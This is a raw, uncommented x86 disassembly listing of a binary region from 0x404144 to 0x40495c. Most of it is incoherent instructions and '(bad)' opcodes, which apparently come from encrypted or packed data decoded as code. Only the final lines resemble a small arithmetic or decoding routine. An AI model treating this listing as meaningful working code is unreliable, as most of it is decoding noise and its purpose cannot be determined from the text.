  404144:	pop    edx
  404145:	sub    al,0x85
  404147:	cwde   
  404148:	idiv   al
  40414a:	sbb    dl,cl
  40414c:	(bad)  
  40414e:	call   0x51f428b9
  404153:	and    eax,0x6bcab2c6
  404158:	sbb    ebx,DWORD PTR [ebx]
  40415a:	inc    esi
  40415b:	push   edx
  40415c:	lea    esi,[edx+0xb]
  40415f:	sbb    BYTE PTR [eax+esi*1],bh
  404162:	ret    0x48a5
  404165:	test   bl,cl
  404167:	mov    DWORD PTR [edi],esi
  404169:	ror    BYTE PTR [ecx+0x218cbbde],1
  40416f:	or     al,0x9f
  404171:	cmp    ecx,DWORD PTR [eax]
  404173:	retf   0xee03
  404176:	add    DWORD PTR [edx],esp
  404178:	stc    
  404179:	jl     0x40412b
  40417b:	mov    ebx,0x1adc63b2
  404180:	jmp    0xfd73:0x8e791d1f
  404187:	mov    ch,0x5c
  404189:	aas    
  40418a:	adc    al,0x4b
  40418c:	push   edi
  40418d:	add    DWORD PTR [ecx-0x5748b11b],edx
  404193:	jmp    0x40412a
  404195:	lods   al,BYTE PTR ds:[esi]
  404196:	pop    ebp
  404197:	push   edi
  404198:	xchg   edx,eax
  404199:	inc    eax
  40419a:	and    bh,BYTE PTR [eax+0x6c]
  40419d:	popf   
  40419e:	mov    bh,0x6b
  4041a0:	adc    BYTE PTR [edi-0x3f],dl
  4041a3:	cmp    eax,0x9336c962
  4041a8:	and    BYTE PTR [edx],al
  4041aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ab:	out    0xca,al
  4041ad:	rcr    BYTE PTR [ebx+0x31],1
  4041b0:	loopne 0x404157
  4041b2:	lods   al,BYTE PTR ds:[esi]
  4041b3:	mov    eax,ds:0x23fef69
  4041b8:	bound  esp,QWORD PTR [eax-0x7b]
  4041bb:	push   edx
  4041bc:	push   esp
  4041bd:	aam    0x63
  4041bf:	xor    dh,BYTE PTR [ebx+ecx*4]
  4041c2:	aaa    
  4041c3:	and    DWORD PTR [edi+0x10],edi
  4041c6:	sub    DWORD PTR [ecx],eax
  4041c8:	xor    BYTE PTR [edx+0x352b73eb],bh
  4041ce:	xchg   esp,eax
  4041cf:	or     eax,0xef17df36
  4041d4:	mov    eax,ds:0x4a8c609b
  4041d9:	not    DWORD PTR [edx]
  4041db:	xchg   esi,eax
  4041dc:	fst    st(3)
  4041de:	jl     0x40423d
  4041e0:	sbb    BYTE PTR [eax-0x11],al
  4041e3:	jp     0x4041f9
  4041e5:	pop    ss
  4041e6:	fucom  st(7)
  4041e8:	sub    DWORD PTR [eax+ecx*1-0x5acc4f9],ebx
  4041ef:	test   DWORD PTR [ecx-0x73c70fe0],ebp
  4041f5:	mov    edx,0xd65991fb
  4041fa:	(bad)  [edx+ecx*4-0x264fca7a]
  404201:	popf   
  404202:	cs jg  0x4041b2
  404205:	adc    eax,0x8d2059f5
  40420a:	pushf  
  40420b:	push   esp
  40420c:	jo     0x4041ec
  40420e:	jnp    0x404199
  404210:	pop    ds
  404211:	mov    DWORD PTR [ebp-0x6e],0x69c4caf3
  404218:	jmp    0x404270
  40421a:	cmc    
  40421b:	sbb    bh,dh
  40421d:	lods   al,BYTE PTR ds:[esi]
  40421e:	xor    eax,0xea5978fb
  404223:	shl    ah,0xa4
  404226:	mov    ebx,0x40db1354
  40422b:	rcr    ebp,1
  40422d:	outs   dx,BYTE PTR ds:[esi]
  40422e:	loope  0x4041f6
  404230:	(bad)  
  404231:	aas    
  404232:	xor    al,0x86
  404234:	pop    ebx
  404235:	xor    bh,BYTE PTR [esi]
  404237:	fiadd  WORD PTR [esi+0x40f88340]
  40423d:	mov    DWORD PTR ds:0x42fdee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	syscall 
  404259:	ror    DWORD PTR [ebp+0x70184fae],1
  40425f:	jo     0x40429e
  404261:	jge    0x4042d3
  404263:	jo     0x404210
  404265:	fucom  st(5)
  404267:	push   edx
  404268:	add    eax,0x3ca1692e
  40426d:	cmc    
  40426e:	pop    eax
  40426f:	out    dx,al
  404270:	outs   dx,DWORD PTR ds:[esi]
  404271:	and    BYTE PTR [edx-0x67],ch
  404274:	jmp    0x8dbb:0x8b00b48d
  40427b:	aaa    
  40427c:	push   esi
  40427d:	inc    esp
  40427e:	ret    
  40427f:	or     al,0xd5
  404281:	sbb    BYTE PTR [eax+ecx*2-0x38],bl
  404285:	sbb    al,cl
  404287:	jmp    0x6e2a:0x26d63888
  40428e:	pushf  
  40428f:	xchg   esp,eax
  404290:	xchg   ecx,eax
  404291:	ficomp DWORD PTR [ebx+0x926b6a3]
  404297:	add    BYTE PTR [edi],bh
  404299:	lds    edx,FWORD PTR [edi+0x1c]
  40429c:	mov    ebx,0xea433711
  4042a1:	mov    eax,0x42f7def7
  4042a6:	xchg   edx,eax
  4042a7:	sbb    DWORD PTR [eax-0x574545e4],ecx
  4042ad:	inc    esi
  4042ae:	xor    esi,DWORD PTR [ebx+0x1a]
  4042b1:	ins    DWORD PTR es:[edi],dx
  4042b2:	or     bl,BYTE PTR [esi-0x2ad73b72]
  4042b8:	sbb    BYTE PTR ds:0xb580c754,cl
  4042be:	dec    edi
  4042bf:	push   esp
  4042c0:	rcl    esp,cl
  4042c2:	std    
  4042c3:	outs   dx,BYTE PTR ds:[esi]
  4042c4:	inc    edi
  4042c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042c6:	sti    
  4042c7:	adc    edi,esi
  4042c9:	push   edi
  4042ca:	hlt    
  4042cb:	mov    edx,0x5cc73300
  4042d0:	aaa    
  4042d1:	call   0xb3adab4b
  4042d6:	sbb    edi,DWORD PTR [edi+0x7399336]
  4042dc:	pop    eax
  4042dd:	mov    gs,ebp
  4042df:	cli    
  4042e0:	xor    DWORD PTR [eax],esi
  4042e2:	inc    edx
  4042e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e5:	jne    0x4042cd
  4042e7:	mov    ebp,0x2824745d
  4042ec:	loopne 0x40431d
  4042ee:	scas   eax,DWORD PTR es:[edi]
  4042ef:	sub    al,0x26
  4042f1:	mov    edx,0x17718108
  4042f6:	push   ebx
  4042f7:	cld    
  4042f8:	pop    ebp
  4042f9:	dec    esp
  4042fa:	in     al,0xc5
  4042fc:	jo     0x40430d
  4042fe:	mov    eax,0x8809f6d5
  404303:	int3   
  404304:	xchg   esp,eax
  404305:	ret    
  404306:	test   al,0x2
  404308:	sub    al,0x5f
  40430a:	pop    ebx
  40430b:	mov    ecx,DWORD PTR [edi-0x44a71fd4]
  404311:	les    edx,FWORD PTR [ecx-0x6a]
  404314:	xor    DWORD PTR [ebx+0x56],edi
  404317:	scas   al,BYTE PTR es:[edi]
  404318:	(bad)  
  404319:	cmp    al,0x25
  40431b:	and    BYTE PTR [esi],bl
  40431d:	ret    
  40431e:	fsub   st,st(6)
  404320:	xchg   esi,eax
  404321:	ds aad 0x86
  404324:	dec    ebx
  404325:	hlt    
  404326:	push   edx
  404327:	xor    ebp,esi
  404329:	aad    0x9f
  40432b:	cmp    dl,ch
  40432d:	mov    eax,ds:0x6ef1b9b1
  404332:	adc    al,BYTE PTR [ebx+0x4606521c]
  404338:	or     al,0x6b
  40433a:	retf   
  40433b:	jp     0x40438e
  40433d:	iret   
  40433e:	fs mov dl,0x56
  404341:	jne    0x4042c4
  404343:	add    ah,bl
  404345:	and    bl,BYTE PTR ds:0x739ad39e
  40434b:	imul   esp,DWORD PTR [eax+0x73],0xd2dbd8df
  404352:	sbb    esp,DWORD PTR [ecx]
  404354:	outs   dx,BYTE PTR ds:[esi]
  404355:	iret   
  404356:	out    0xe7,eax
  404358:	(bad)  
  40435a:	outs   dx,BYTE PTR ds:[esi]
  40435b:	mov    cl,0x36
  40435d:	xor    ebx,edi
  40435f:	test   al,0xf3
  404361:	iret   
  404362:	push   ds
  404363:	push   edx
  404364:	cld    
  404365:	or     esi,ebp
  404367:	jg     0x404301
  404369:	adc    al,0x22
  40436b:	jl     0x4043b6
  40436d:	pop    esi
  40436e:	scas   eax,DWORD PTR es:[edi]
  40436f:	mov    al,ds:0x9d9242e3
  404374:	jne    0x4043da
  404376:	in     eax,dx
  404377:	daa    
  404378:	rol    BYTE PTR [ebx-0x2d0d1c39],cl
  40437e:	cdq    
  40437f:	retf   0x3fa3
  404382:	add    al,0x53
  404384:	pop    ecx
  404385:	(bad)  
  404387:	es jo  0x404318
  40438a:	scas   eax,DWORD PTR es:[edi]
  40438b:	iret   
  40438c:	mov    dh,0x25
  40438e:	mov    ch,0xa5
  404390:	fs mov ecx,0xe3cf1fa7
  404396:	rcr    ebx,1
  404398:	jnp    0x4043bd
  40439a:	sbb    ecx,0x1236edae
  4043a0:	push   esp
  4043a1:	mov    ah,0x8c
  4043a3:	jmp    0x666d:0x618db746
  4043aa:	sbb    al,0x70
  4043ac:	pop    esi
  4043ad:	xor    BYTE PTR ds:0x6468ea01,bh
  4043b3:	pop    esi
  4043b4:	mov    ch,0x6d
  4043b6:	(bad)  [esi+0x7e]
  4043b9:	daa    
  4043ba:	test   BYTE PTR [edi-0x66],dl
  4043bd:	in     eax,0xb2
  4043bf:	sbb    DWORD PTR [ebx-0x15a8f116],ebp
  4043c5:	(bad)  
  4043c6:	dec    edi
  4043c7:	cmp    BYTE PTR [ecx-0x552965c0],bh
  4043cd:	and    ecx,ecx
  4043cf:	stos   DWORD PTR es:[edi],eax
  4043d0:	mov    bh,0xc
  4043d2:	pop    ebp
  4043d3:	cwde   
  4043d4:	js     0x4043b0
  4043d6:	push   ss
  4043d7:	sbb    bl,BYTE PTR [eax+eax*8]
  4043da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043db:	and    DWORD PTR ds:0x44742988,edx
  4043e1:	pop    ecx
  4043e2:	mov    bl,0x5
  4043e4:	lock mov ebp,0x84c6032f
  4043ea:	std    
  4043eb:	jb     0x404451
  4043ed:	sub    al,0x27
  4043ef:	imul   edi,DWORD PTR [ebp-0x65],0xe510b288
  4043f6:	push   cs
  4043f7:	(bad)  
  4043f9:	jne    0x4043d0
  4043fb:	lahf   
  4043fc:	inc    edx
  4043fd:	cld    
  4043fe:	lahf   
  4043ff:	jbe    0x40445a
  404401:	dec    ebp
  404402:	ret    
  404403:	push   edi
  404404:	xor    ecx,DWORD PTR [edi]
  404406:	dec    ecx
  404407:	sub    DWORD PTR [ecx-0x40],ebx
  40440a:	jnp    0x40445f
  40440c:	xchg   esp,eax
  40440d:	sub    DWORD PTR [ebx+0x77],edx
  404410:	lds    edx,FWORD PTR [ebx-0x33]
  404413:	mov    ?,edx
  404415:	xchg   esi,eax
  404416:	cmp    ecx,DWORD PTR [edx-0x72]
  404419:	and    BYTE PTR [esi+0x62],bh
  40441c:	daa    
  40441d:	cmp    DWORD PTR [esp+ecx*2+0x74fb2ccf],ebp
  404424:	xor    DWORD PTR [eax-0x60],esi
  404427:	adc    eax,0xd233540f
  40442c:	pop    es
  40442d:	sub    DWORD PTR [ecx-0x26aab3c5],0x53
  404434:	in     al,0xa2
  404436:	test   eax,0x3c79a9fa
  40443b:	dec    ecx
  40443c:	es clc 
  40443e:	mov    edi,0x20f033fa
  404443:	clc    
  404444:	fist   DWORD PTR [edi+0x2f0fdef]
  40444a:	add    ah,cl
  40444c:	or     edx,DWORD PTR [esi-0x5c]
  40444f:	sbb    DWORD PTR [edi+edi*2+0x31542907],0x45fea83
  40445a:	test   BYTE PTR [ebp+0x1],cl
  40445d:	xor    eax,0x4e4a50c5
  404462:	mov    dh,0x4d
  404464:	mov    ch,0x1
  404466:	inc    ecx
  404467:	sub    DWORD PTR [ecx+0x3e],esi
  40446a:	loope  0x404440
  40446c:	and    eax,0x4e79610d
  404471:	pop    es
  404472:	js     0x404414
  404474:	inc    esi
  404475:	or     eax,0xc64264ad
  40447a:	sub    ebx,DWORD PTR [edx-0x49]
  40447d:	outs   dx,DWORD PTR ds:[esi]
  40447e:	dec    ebp
  40447f:	sub    DWORD PTR [edi+0x349fe9ca],esp
  404485:	ds popa 
  404487:	dec    edi
  404488:	rcr    ebp,0x0
  40448b:	hlt    
  40448c:	and    eax,0x35922b41
  404491:	sub    ch,bl
  404493:	sub    ecx,ebp
  404495:	mov    cl,0x92
  404497:	sbb    ebp,esi
  404499:	nop
  40449a:	and    dl,ah
  40449c:	push   0x4
  40449e:	imul   ebp,edi,0xffffffd5
  4044a1:	aas    
  4044a2:	mov    DWORD PTR [edx+ebp*2+0x1d309ab5],esi
  4044a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044aa:	sub    BYTE PTR [edi],dl
  4044ac:	shr    BYTE PTR [esi-0x5c],0xaa
  4044b0:	or     ah,BYTE PTR [edx-0x41ca3d18]
  4044b6:	cmp    eax,DWORD PTR [edx-0x74]
  4044b9:	mov    ebp,0x944281db
  4044be:	mov    cs,eax
  4044c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c1:	pop    ss
  4044c2:	das    
  4044c3:	push   esi
  4044c4:	mov    eax,ds:0xa14edb37
  4044c9:	test   BYTE PTR gs:[ecx],cl
  4044cc:	mov    bh,0x75
  4044ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044cf:	std    
  4044d0:	sub    DWORD PTR [eax-0x5a],ecx
  4044d3:	adc    ah,ch
  4044d5:	mov    ecx,0xec9a7e75
  4044da:	stc    
  4044db:	jmp    0xccab:0x2b71af4c
  4044e2:	xlat   BYTE PTR ds:[ebx]
  4044e3:	(bad)  
  4044e4:	mov    edi,0x882d1e8
  4044e9:	and    ebx,ecx
  4044eb:	dec    esi
  4044ec:	cmp    BYTE PTR [eax],0xa7
  4044ef:	mov    ss,ebx
  4044f1:	push   ecx
  4044f2:	fbstp  TBYTE PTR [esi+0x55]
  4044f5:	iret   
  4044f6:	test   ah,ah
  4044f8:	sub    esp,ebp
  4044fa:	jmp    0xddd85b02
  4044ff:	sub    dh,bl
  404501:	mov    edx,ecx
  404503:	jg     0x40448a
  404505:	sahf   
  404506:	cmovp  edi,DWORD PTR [edi+0x20]
  40450a:	push   esp
  40450b:	lea    eax,[esi]
  40450d:	dec    esi
  40450e:	stos   BYTE PTR es:[edi],al
  40450f:	imul   ebx,edi,0xe
  404512:	add    DWORD PTR [ecx],edx
  404514:	add    edx,DWORD PTR [eax-0x3e]
  404517:	mov    bl,0x40
  404519:	or     bh,BYTE PTR [ebp+0x1c]
  40451c:	cmp    eax,0xe230d0e4
  404521:	push   ds
  404522:	(bad)  
  404523:	mov    al,0x47
  404525:	nop
  404526:	nop
  404527:	cmp    ch,cl
  404529:	les    esp,FWORD PTR [edx+0x3]
  40452c:	inc    esp
  40452d:	scas   al,BYTE PTR es:[edi]
  40452e:	jge    0x4045ae
  404530:	cmp    BYTE PTR [esi],bl
  404532:	jmp    DWORD PTR [esi+0x2c]
  404535:	stc    
  404536:	and    BYTE PTR [edi],ah
  404538:	psllw  mm7,mm0
  40453b:	(bad)  
  40453c:	call   0xd40e:0x73b8983
  404543:	push   edx
  404544:	cwde   
  404545:	mov    eax,0x7b82aaf
  40454a:	fnstsw WORD PTR [ecx+0x70e897ad]
  404550:	scas   eax,DWORD PTR es:[edi]
  404551:	shl    BYTE PTR [edx+0x3c8b1199],1
  404557:	call   0x36f9:0xd1936638
  40455e:	retf   0x2993
  404561:	mov    ah,0x25
  404563:	aas    
  404564:	adc    BYTE PTR [ebp+0x55368a2e],dh
  40456a:	sub    BYTE PTR ds:0xa4aee2fc,bh
  404570:	cdq    
  404571:	ficomp WORD PTR [edi]
  404573:	clc    
  404574:	ret    0xee39
  404577:	xor    BYTE PTR [eax],0x87
  40457a:	xor    al,0xac
  40457c:	and    BYTE PTR [edx],0x6
  40457f:	fsubr  DWORD PTR [edi+eiz*4]
  404582:	mov    ah,0xd9
  404584:	in     eax,0xec
  404586:	ret    
  404587:	gs xor eax,0x85b21b9f
  40458d:	dec    eax
  40458e:	mov    al,ds:0xf572d075
  404593:	jns    0x40459b
  404595:	xchg   BYTE PTR [esi+0x60],bh
  404598:	bound  esp,QWORD PTR [edx]
  40459a:	ja     0x404614
  40459c:	pop    ds
  40459d:	xchg   al,dh
  40459f:	dec    esp
  4045a0:	pop    eax
  4045a1:	out    dx,eax
  4045a2:	xchg   edi,eax
  4045a3:	dec    edi
  4045a4:	sti    
  4045a5:	inc    eax
  4045a6:	add    BYTE PTR [edi],cl
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fe02
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c8:	enter  0x6c3,0xc
  4045cc:	and    al,0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x404593
  4045d4:	fcomp  QWORD PTR ds:[esi-0x60cae929]
  4045db:	pop    esp
  4045dc:	sbb    eax,0x6a84dfe2
  4045e1:	into   
  4045e2:	add    DWORD PTR [esi+edx*1],0xc789c566
  4045e9:	cmp    ebp,0xffffff95
  4045ec:	stos   BYTE PTR es:[edi],al
  4045ed:	inc    esi
  4045ee:	imul   ecx,DWORD PTR [edi-0x622cce35],0xffffff98
  4045f5:	or     DWORD PTR [eax],0x1578b4e5
  4045fb:	cmp    ch,cl
  4045fd:	cld    
  4045fe:	(bad)  
  4045ff:	jecxz  0x4045c3
  404601:	rcl    cl,0x8f
  404604:	jne    0x40462f
  404606:	push   eax
  404607:	pop    edx
  404608:	loopne 0x40461d
  40460a:	scas   eax,DWORD PTR es:[edi]
  40460b:	xchg   esi,eax
  40460c:	or     al,0xb1
  40460e:	add    ah,BYTE PTR [edx+edi*2+0x70e6ae57]
  404615:	dec    edi
  404616:	push   0x4c3344cf
  40461b:	retf   
  40461c:	mov    ch,BYTE PTR [edi]
  40461e:	hlt    
  40461f:	in     al,dx
  404620:	ret    
  404621:	sbb    DWORD PTR [ebx+0x41],0xedf8f29c
  404628:	icebp  
  404629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40462a:	dec    esp
  40462b:	mov    esp,0x74795a8e
  404630:	or     al,BYTE PTR [esp]
  404633:	dec    ebp
  404634:	push   ss
  404635:	adc    esp,esp
  404637:	fisubr WORD PTR ds:0xe3ef6da3
  40463d:	into   
  40463e:	imul   DWORD PTR [ebp+0x16]
  404641:	sahf   
  404642:	xchg   edx,eax
  404643:	inc    esi
  404644:	rcr    BYTE PTR [ecx-0x4da27e6a],cl
  40464a:	lahf   
  40464b:	seto   BYTE PTR [esi-0x1a]
  40464f:	aam    0x69
  404651:	fsub   st,st(5)
  404653:	adc    bl,BYTE PTR [ebp+esi*4-0x557558ae]
  40465a:	xchg   BYTE PTR [ebp-0xc3cebc3],ch
  404660:	pop    ecx
  404661:	je     0x40462d
  404663:	test   DWORD PTR [edx-0x39da4e79],esp
  404669:	call   0x50e1c881
  40466e:	leave  
  40466f:	test   eax,0x16173aa4
  404674:	adc    al,0xc
  404676:	jnp    0x404600
  404678:	pop    ss
  404679:	mov    dh,0x38
  40467b:	mov    esp,0xac684e6b
  404680:	or     BYTE PTR ds:0xdff1c93f,cl
  404686:	outs   dx,DWORD PTR ds:[esi]
  404687:	pop    esp
  404688:	push   edi
  404689:	add    eax,ecx
  40468b:	xor    cl,BYTE PTR [ebx-0x77]
  40468e:	clc    
  40468f:	fistp  QWORD PTR [eax]
  404691:	mov    ecx,0xeca2b3be
  404696:	xchg   BYTE PTR [edx+0x9bccbb7],bl
  40469c:	popf   
  40469d:	sti    
  40469e:	cmovnp edx,DWORD PTR [edx]
  4046a1:	xor    ah,BYTE PTR [ebx+0x51d2e9fa]
  4046a7:	mov    bh,0x68
  4046a9:	add    dh,BYTE PTR [ecx-0x313609af]
  4046af:	dec    ebp
  4046b0:	mov    edi,0x94b1c7e
  4046b5:	inc    ebx
  4046b6:	jle    0x4046b5
  4046b8:	mov    ebx,0x305a48f7
  4046bd:	icebp  
  4046be:	add    al,bl
  4046c0:	xor    al,0xd0
  4046c2:	mov    bl,0x49
  4046c4:	mov    edx,0x4343e7ec
  4046c9:	inc    ebp
  4046ca:	xchg   esp,eax
  4046cb:	mov    eax,0xcd1ba0ba
  4046d0:	fstp   TBYTE PTR [ebx+0x158a6edf]
  4046d6:	pop    ss
  4046d7:	cmp    eax,0xe2a88810
  4046dc:	jae    0x4046b0
  4046de:	sbb    DWORD PTR [ebx+0x2151d4c5],edi
  4046e4:	sub    eax,DWORD PTR [edi+0x2fa41889]
  4046ea:	jge    0x4046f3
  4046ec:	jg     0x404766
  4046ee:	ret    
  4046ef:	mov    DWORD PTR [ecx+0x66252133],esi
  4046f5:	popf   
  4046f6:	pop    esi
  4046f7:	loopne 0x4046f1
  4046f9:	or     eax,0xe38de33d
  4046fe:	les    ecx,FWORD PTR [ecx-0x57]
  404701:	xchg   ebp,eax
  404702:	je     0x40473a
  404704:	dec    BYTE PTR [ecx+esi*1-0x5e]
  404708:	retf   
  404709:	iret   
  40470a:	and    esi,DWORD PTR [edi+0x31]
  40470d:	cmp    eax,0x91e7b686
  404712:	aam    0x75
  404714:	cmp    BYTE PTR ds:0xcd0b0559,ah
  40471a:	into   
  40471b:	and    eax,DWORD PTR ds:0xbeaca57e
  404721:	popa   
  404722:	ins    BYTE PTR es:[edi],dx
  404723:	ds push esi
  404725:	imul   edi,DWORD PTR [edi+0x2f3c81],0x96343c43
  40472f:	(bad)  
  404730:	push   0xf74d92ea
  404735:	mov    esi,0xb030baec
  40473a:	fidiv  DWORD PTR [ecx]
  40473c:	loope  0x40473d
  40473e:	cmp    dh,cl
  404740:	enter  0xebc8,0xb4
  404744:	cli    
  404745:	repz sub bh,BYTE PTR [eax+ecx*2-0x47]
  40474a:	xor    BYTE PTR [eax-0x2d52c027],cl
  404750:	out    0x8,eax
  404752:	add    eax,0x91ab7e20
  404757:	rcl    DWORD PTR [edi+0x76],cl
  40475a:	imul   esp,DWORD PTR [eax+0x64],0xffffffca
  40475e:	and    eax,0x608e88b
  404763:	fadd   QWORD PTR [ebx+0x6c9eda71]
  404769:	popf   
  40476a:	div    dh
  40476c:	sbb    al,0xb1
  40476e:	aam    0x5d
  404770:	in     eax,0x65
  404772:	pop    ecx
  404773:	mov    esp,0x234f5e8a
  404778:	mov    cl,0x7f
  40477a:	repz gs lahf 
  40477d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477e:	mov    esi,0x705e7a4f
  404783:	daa    
  404784:	push   edi
  404785:	sbb    BYTE PTR [ebp-0x1e0ad0ab],dh
  40478b:	ds jg  0x404755
  40478e:	shl    BYTE PTR [edi+0x211ad53e],cl
  404794:	mov    edx,0x7c25f842
  404799:	xchg   DWORD PTR [edx+0x2d],edi
  40479c:	xchg   esp,eax
  40479d:	retf   0xde04
  4047a0:	mov    bh,0x63
  4047a2:	push   ss
  4047a3:	imul   ecx,DWORD PTR [ebp-0x20],0xffffffc7
  4047a7:	xor    al,BYTE PTR [esi]
  4047a9:	mov    dh,0xb0
  4047ab:	gs jmp 0x99c4:0xace95adc
  4047b3:	jp     0x40476e
  4047b5:	or     ebp,DWORD PTR [esp+ecx*1-0x3]
  4047b9:	loop   0x404766
  4047bb:	xchg   edi,eax
  4047bc:	in     eax,dx
  4047bd:	adc    DWORD PTR [esi-0x62],eax
  4047c0:	lods   al,BYTE PTR ds:[esi]
  4047c1:	stc    
  4047c2:	pusha  
  4047c3:	push   ebp
  4047c4:	fld    st(1)
  4047c6:	mov    ebx,0x2bee456a
  4047cb:	push   esi
  4047cc:	(bad)  
  4047cd:	cmp    eax,0x13a35b30
  4047d2:	lods   eax,DWORD PTR ds:[esi]
  4047d3:	rcl    esi,1
  4047d5:	pusha  
  4047d6:	push   0xffffffc0
  4047d8:	push   ecx
  4047d9:	or     al,0xaa
  4047db:	jns    0x404794
  4047dd:	repnz addr16 sub al,0x2d
  4047e1:	dec    ecx
  4047e2:	push   ebp
  4047e3:	push   cs
  4047e4:	xchg   ebx,ebp
  4047e6:	or     bh,BYTE PTR [ecx]
  4047e8:	pop    edi
  4047e9:	cmp    eax,0xc2042171
  4047ee:	lock jne 0x4047aa
  4047f1:	cmp    dl,0x22
  4047f4:	pop    ecx
  4047f5:	and    BYTE PTR [ebp+ecx*8-0x1f],dh
  4047f9:	mov    al,0x54
  4047fb:	dec    edx
  4047fc:	cmp    DWORD PTR [ebp+0x73],eax
  4047ff:	or     bl,0xec
  404802:	push   esp
  404803:	mov    dl,0x9a
  404805:	sbb    DWORD PTR ds:0x5b64c29a,0xffffff8d
  40480c:	mov    esp,0x729ffdf1
  404811:	xor    eax,0xb1dc364d
  404816:	push   ecx
  404817:	test   BYTE PTR [edx+0x5f],ch
  40481a:	xor    DWORD PTR [ecx],esi
  40481c:	aaa    
  40481d:	and    al,0x7d
  40481f:	shl    edi,cl
  404821:	xchg   ebp,eax
  404822:	sti    
  404823:	mov    cl,0x8f
  404825:	js     0x404872
  404827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404828:	xchg   esp,eax
  404829:	mov    DWORD PTR [edx-0x8659750],edi
  40482f:	pop    ebx
  404830:	les    esi,FWORD PTR [eax]
  404832:	adc    cl,al
  404834:	pop    es
  404835:	cmp    esp,DWORD PTR gs:[edi+0x1a721575]
  40483c:	cmp    DWORD PTR [ebp-0x2a],edi
  40483f:	(bad)  
  404840:	popf   
  404841:	cmp    DWORD PTR ds:0x681a035b,edi
  404847:	in     eax,dx
  404848:	bound  eax,QWORD PTR [edi+0x6d031387]
  40484e:	sbb    eax,DWORD PTR [ebp+0x12df6703]
  404854:	pop    ebp
  404855:	dec    eax
  404856:	push   esi
  404857:	jle    0x40489f
  404859:	mov    edx,0x722a5514
  40485e:	or     BYTE PTR [ecx-0x61],0x48
  404862:	xchg   BYTE PTR [eax+0x3b201f10],cl
  404868:	xor    edi,DWORD PTR [ebp-0xc]
  40486b:	fwait
  40486c:	stos   DWORD PTR es:[edi],eax
  40486d:	add    al,0x47
  40486f:	out    0x8d,al
  404871:	mov    bh,0x11
  404873:	(bad)  
  404874:	lds    esi,FWORD PTR [edx-0x6a]
  404877:	shl    BYTE PTR [esi-0x3af98338],cl
  40487d:	jl     0x4048de
  40487f:	cmp    DWORD PTR [edx+ebx*1+0x3966edb6],0x10
  404887:	leave  
  404888:	sti    
  404889:	call   0x5929716e
  40488e:	push   es
  40488f:	lods   al,BYTE PTR ds:[esi]
  404890:	pop    eax
  404891:	cmp    ecx,esp
  404893:	pop    ebx
  404894:	xchg   esi,eax
  404895:	push   esp
  404896:	stos   DWORD PTR es:[edi],eax
  404897:	retfw  
  404899:	ds pushf 
  40489b:	ret    
  40489c:	les    edi,FWORD PTR [eax]
  40489e:	adc    al,al
  4048a0:	loop   0x4048db
  4048a2:	ret    0x3588
  4048a5:	adc    BYTE PTR [edx-0x4c4589db],0xdd
  4048ac:	test   eax,0xbb1482ad
  4048b1:	fwait
  4048b2:	sbb    cl,BYTE PTR [ebp-0x40]
  4048b5:	jg     0x4048fb
  4048b7:	mov    WORD PTR [ecx],es
  4048b9:	in     eax,0xf8
  4048bb:	inc    ebx
  4048bc:	push   ds
  4048bd:	adc    eax,0xd4332853
  4048c2:	retf   0x4e65
  4048c5:	(bad)  
  4048c6:	fld    DWORD PTR gs:[ebp+0x4fbea1e]
  4048cd:	jne    0x40486b
  4048cf:	cmp    eax,0x4b7f5571
  4048d4:	and    esi,DWORD PTR [ebp-0x3d]
  4048d7:	dec    esi
  4048d8:	jo     0x40492a
  4048da:	stos   DWORD PTR es:[edi],eax
  4048db:	out    dx,al
  4048dc:	mov    edx,edx
  4048de:	inc    ebp
  4048df:	inc    edi
  4048e0:	inc    ecx
  4048e1:	data16 fild WORD PTR [ebp+0x5d0f6426]
  4048e8:	arpl   sp,di
  4048ea:	stc    
  4048eb:	or     al,0xb2
  4048ed:	mov    edi,0x72d76c23
  4048f2:	jmp    0x4048d4
  4048f4:	jns    0x4048f3
  4048f6:	cmp    eax,DWORD PTR [edx+0x58682f1b]
  4048fc:	and    eax,0xafd849d6
  404902:	push   eax
  404903:	aam    0xd8
  404905:	cmp    bl,BYTE PTR [edi]
  404907:	jp     0x4048b6
  404909:	test   DWORD PTR [ecx],0x781cac78
  40490f:	into   
  404910:	add    BYTE PTR [ebx-0x4a],0x3
  404914:	pop    esi
  404915:	inc    ebp
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e19c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e1a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e77f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e1b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd85,0x42e1b4
